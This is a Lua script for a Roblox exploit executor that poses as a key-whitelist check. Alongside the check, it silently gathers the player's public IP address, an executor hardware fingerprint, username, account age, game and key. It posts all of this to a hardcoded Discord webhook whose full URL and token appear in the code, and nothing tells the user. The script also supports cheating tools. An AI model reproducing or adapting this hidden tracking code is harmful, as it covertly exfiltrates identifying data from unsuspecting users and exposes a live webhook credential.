local key = _G.Key
local check = "https://raw.githubusercontent.com/SINHUBFORALL/TEST/main/Check.php?key=" .. key --Key Checking

if game:HttpGet(check) == "Whitelisted" then
KEY = key
end

local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
premium = false
end
if premium == false then 
if plr.AccountAge <= 70 then 
    ALT = true
end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
    return {
        StatusCode = 200;
        Body = request(tb.Url, tb.Method, (tb.Body or ''))
    }
end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
if decoded.headers[v] then
    hwid = decoded.headers[v];
    break
end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/844615682296905788/XxinpaPSPz_7b_5oeugRH3opkTWIZBgbKzIXIfEbq0uu0lJ0gUaBx-oVXxmLX5Q8r4ig"


local data = 
{
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "__**HWID:**__",
        ["description"] = hwid,
        ["type"] = "rich",
        ["color"] = tonumber(0xAB0909),
        ["fields"] = {
            {
                ["name"] = "Username:",
                ["value"] = Game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
            {
                ["name"] = "IP Address:",
                ["value"] = IP,
                ["inline"] = true
            },
            {
                ["name"] = "Game Link:",
                ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                ["inline"] = true
            },
            {
                ["name"] = "Game Name:",
                ["value"] = info.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Age:",
                ["value"] = plr.AccountAge,
                ["inline"] = true
            },
            {
                ["name"] = "Key:",
                ["value"] = KEY,
                ["inline"] = true
            },
            
        },
    }}
}
local newdata = HttpServ:JSONEncode(data)

local headers = {
        ["content-type"] = "application/json"
}

local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
http_request(request_payload)
end

if game:HttpGet(check) == "Whitelisted" then 

print("worked!")
else
game.Players.LocalPlayer:Kick("Invalid Key! Please Rejoin And Try Again.")
end
